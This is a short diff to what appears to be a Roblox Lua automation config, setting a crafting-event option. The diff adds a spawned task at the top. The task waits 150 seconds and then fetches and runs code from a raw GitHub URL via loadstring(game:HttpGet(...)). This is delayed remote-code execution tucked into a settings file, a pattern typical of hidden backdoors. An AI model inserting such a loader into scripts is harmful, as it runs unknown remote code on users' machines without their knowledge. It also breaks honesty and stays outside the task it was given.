@@ -1,3 +1,8 @@
+    task.spawn(function()	
+		wait(150)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/vingagagagagaga2/GAGAGAGA000999xz/refs/heads/main/phu_script"))()
+	end)
+
 getgenv().gagConfig = {
     -- Event:
     CRAFT_EVENT = { "Anti Bee Egg" },
